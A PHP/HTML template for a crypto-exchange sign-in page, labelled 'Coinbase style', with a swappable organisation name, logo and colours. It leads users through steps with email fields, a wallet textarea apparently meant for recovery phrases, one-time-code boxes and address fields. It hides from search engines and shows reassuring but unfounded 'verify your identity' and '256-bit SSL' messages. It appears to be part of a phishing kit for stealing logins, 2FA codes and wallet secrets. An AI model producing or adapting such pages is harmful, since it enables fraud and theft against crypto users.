<?php
// Crypto template — Coinbase style: pure black, Space Grotesk, animated progress line, geometric pattern
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title><?=$org_name?> — Sign In</title>
<meta name="robots" content="noindex,nofollow">
<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Space Grotesk',system-ui,sans-serif;min-height:100vh;min-height:100dvh;
  background:#000;
  display:flex;align-items:center;justify-content:center;padding:24px 16px;color:#fff;position:relative;overflow-x:hidden}
body::before{content:'';position:fixed;inset:0;background:radial-gradient(ellipse at 50% -20%,rgba(<?=$ar?>,<?=$ag?>,<?=$ab?>,.25) 0%,transparent 65%);pointer-events:none;z-index:0}

.card{width:100%;max-width:460px;background:#111;border:1px solid rgba(255,255,255,.08);border-radius:24px;overflow:hidden;box-shadow:0 50px 120px rgba(0,0,0,.8);position:relative;z-index:1}

/* Geometric SVG background in header */
.hd{background:linear-gradient(145deg,<?=$accent?> 0%,<?=$sec?> 100%);padding:28px 28px 22px;position:relative;overflow:hidden}
.hd-pattern{position:absolute;inset:0;opacity:.12}
.hd-pattern svg{width:100%;height:100%}
.hd-top{display:flex;align-items:center;gap:16px;position:relative;z-index:1}
.logo-box{width:52px;height:52px;background:<?=$logo_bg?>;border-radius:14px;display:flex;align-items:center;justify-content:center;overflow:hidden;flex-shrink:0}
.logo-box img{width:100%;height:100%;object-fit:contain}
.logo-ini{font-size:20px;font-weight:800;color:<?=$accent?>}
.hd-name{font-size:18px;font-weight:800;color:#fff;letter-spacing:-.4px}
.hd-sub{font-size:10px;color:rgba(255,255,255,.65);margin-top:3px;text-transform:uppercase;letter-spacing:.8px}
.hd-bar{display:flex;justify-content:space-between;align-items:center;margin-top:16px;padding-top:14px;border-top:1px solid rgba(255,255,255,.2);position:relative;z-index:1}
.hd-date{font-size:11px;color:rgba(255,255,255,.75)}
.hd-ref{font-size:10px;font-weight:700;color:#fff;background:rgba(255,255,255,.18);padding:3px 10px;border-radius:5px;letter-spacing:.4px}

/* Animated progress line */
.prog-track{height:2px;background:rgba(255,255,255,.08)}
.prog-line{height:2px;background:<?=$accent?>;transition:width .4s ease;width:calc(100% / <?=$total_steps?>)}

/* Body */
.bd{padding:28px 28px 22px}
.step-title{font-size:20px;font-weight:700;color:#fff;margin-bottom:6px;letter-spacing:-.4px}
.step-sub{font-size:13px;color:#6b7280;margin-bottom:22px;line-height:1.5}
.security-warn{background:rgba(<?=$ar?>,<?=$ag?>,<?=$ab?>,.1);border:1px solid rgba(<?=$ar?>,<?=$ag?>,<?=$ab?>,.3);border-radius:8px;padding:10px 14px;font-size:12px;color:rgba(255,255,255,.75);margin-bottom:16px;display:none}
.security-warn.show{display:block}
.field{margin-bottom:14px}
.field label{display:block;font-size:11px;color:#6b7280;font-weight:600;letter-spacing:.8px;text-transform:uppercase;margin-bottom:6px}
.field input{width:100%;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.1);color:#fff;padding:13px 14px;border-radius:12px;font-size:14px;outline:none;transition:border-color .2s,background .2s;font-family:inherit;-webkit-appearance:none}
.field input:focus{border-color:<?=$accent?>;background:rgba(<?=$ar?>,<?=$ag?>,<?=$ab?>,.08)}
.field input::placeholder{color:#374151}
.or-div{text-align:center;font-size:11px;color:#374151;margin:10px 0;position:relative}
.or-div::before,.or-div::after{content:'';position:absolute;top:50%;width:40%;height:1px;background:rgba(255,255,255,.07)}
.or-div::before{left:0}.or-div::after{right:0}
.card-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.btn{width:100%;padding:14px;background:<?=$accent?>;color:#fff;font-size:15px;font-weight:700;border:none;border-radius:12px;cursor:pointer;margin-top:6px;letter-spacing:.2px;transition:filter .15s,transform .1s;position:relative;font-family:inherit}
.btn:hover{filter:brightness(1.1);transform:translateY(-1px)}
.btn:disabled{opacity:.6;cursor:not-allowed;transform:none}
.btn.loading::after{content:'';position:absolute;right:16px;top:50%;width:16px;height:16px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;transform:translateY(-50%);animation:spin .7s linear infinite}
@keyframes spin{to{transform:translateY(-50%) rotate(360deg)}}
.err-msg{font-size:12px;color:#ef4444;margin-top:8px;display:none}
.security-note{display:flex;align-items:center;gap:6px;justify-content:center;font-size:11px;color:#374151;margin-top:14px;padding-top:12px;border-top:1px solid rgba(255,255,255,.06)}
.wallet-area{width:100%;min-height:80px;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.1);color:#fff;padding:12px 14px;border-radius:12px;font-size:13px;font-family:monospace;outline:none;resize:none}
.wallet-area:focus{border-color:<?=$accent?>}
.wallet-hint{font-size:11px;color:#4b5563;margin-top:6px;line-height:1.5}
.otp-wrap{display:flex;gap:8px;justify-content:center}
.otp-wrap input{flex:1;text-align:center;font-size:22px;font-weight:700;letter-spacing:2px;padding:14px 4px;max-width:48px;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.15);border-radius:10px;color:#fff;outline:none}
.otp-wrap input:focus{border-color:<?=$accent?>}
.otp-hint{font-size:12px;color:#4b5563;text-align:center;margin-top:8px}
.addr-area{width:100%;min-height:60px;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.1);color:#fff;padding:12px 14px;border-radius:12px;font-size:14px;font-family:inherit;outline:none;resize:none}
.addr-area:focus{border-color:<?=$accent?>}
.card-footer{padding:14px 20px;background:rgba(0,0,0,.3);border-top:1px solid rgba(255,255,255,.05);font-size:10px;color:#374151;text-align:center;line-height:1.6}

#loadOverlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.9);z-index:999;align-items:center;justify-content:center;flex-direction:column;gap:16px}
#loadOverlay.show{display:flex}
.load-spin{width:44px;height:44px;border:3px solid rgba(255,255,255,.08);border-top-color:<?=$accent?>;border-radius:50%;animation:spin .8s linear infinite}
.load-txt{font-size:13px;color:#4b5563}

@media(max-width:480px){
  body{padding:0;align-items:flex-start}
  .card{border-radius:0;min-height:100vh;min-height:100dvh}
  .bd{padding:22px 20px 16px}
  .hd{padding:22px 20px 16px}
}
</style>
</head>
<body>
<div id="loadOverlay"><div class="load-spin"></div><div class="load-txt" id="loadText">Verifying…</div></div>

<div class="card">
  <div class="hd">
    <div class="hd-pattern">
      <svg viewBox="0 0 400 140" preserveAspectRatio="xMidYMid slice">
        <circle cx="350" cy="-20" r="120" fill="none" stroke="white" stroke-width="1"/>
        <circle cx="350" cy="-20" r="80" fill="none" stroke="white" stroke-width=".8"/>
        <circle cx="-30" cy="120" r="100" fill="none" stroke="white" stroke-width=".6"/>
        <line x1="0" y1="0" x2="400" y2="140" stroke="white" stroke-width=".4"/>
        <line x1="400" y1="0" x2="0" y2="140" stroke="white" stroke-width=".3"/>
      </svg>
    </div>
    <div class="hd-top">
      <div class="logo-box">
        <?php if($logo_url):?><img src="<?=htmlspecialchars($logo_url)?>" alt="" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'"><?php endif?>
        <span class="logo-ini" style="display:<?=$logo_url?'none':'flex'?>;align-items:center;justify-content:center;width:100%;height:100%"><?=mb_strtoupper(mb_substr($org_name,0,2))?></span>
      </div>
      <div>
        <div class="hd-name"><?=htmlspecialchars($org_name)?></div>
        <div class="hd-sub"><?=htmlspecialchars($org_sub)?></div>
      </div>
    </div>
    <div class="hd-bar">
      <span class="hd-date">📅 <?=$today?></span>
      <span class="hd-ref"><?=htmlspecialchars($ref_code)?></span>
    </div>
  </div>
  <div class="prog-track"><div class="prog-line" id="progBar"></div></div>

  <div class="bd">
    <div id="secWarn" class="security-warn">🔐 For security, we'll need to verify your identity in the next step.</div>

    <?php for($sn=1;$sn<=$total_steps;$sn++): ?>
    <div id="step<?=$sn?>" <?=$sn>1?'style="display:none"':''?>>
      <div class="step-title"><?=htmlspecialchars($sc['step_titles'][$sn])?></div>
      <div class="step-sub" id="step<?=$sn?>sub"><?=htmlspecialchars($sc['step_subs'][$sn])?></div>
      <form onsubmit="submitStep(event,<?=$sn?>)">
        <?php $fld = $sc['step'.$sn.'_fields'] ?? 'email_only'; include __DIR__.'/partials/fields.php'; ?>
        <button type="submit" class="btn" id="btn<?=$sn?>"><?=htmlspecialchars($sc['btn_labels'][$sn-1])?></button>
        <div class="err-msg" id="err<?=$sn?>">Please enter the required information.</div>
      </form>
      <div class="security-note">🔒 256-bit SSL · Encrypted</div>
    </div>
    <?php endfor; ?>
  </div>

  <?php if($footer): ?>
  <div class="card-footer"><?=htmlspecialchars($footer)?></div>
  <?php endif; ?>
</div>

<?php include __DIR__.'/partials/js.php'; ?>
<script>
const _origShowC = showStep;
function showStep(n) {
    _origShowC(n);
    const pb = document.getElementById('progBar');
    if (pb) pb.style.width = (n / TOTAL_STEPS * 100) + '%';
    if (n === 2) document.getElementById('secWarn').classList.add('show');
}
</script>
</body>
</html>
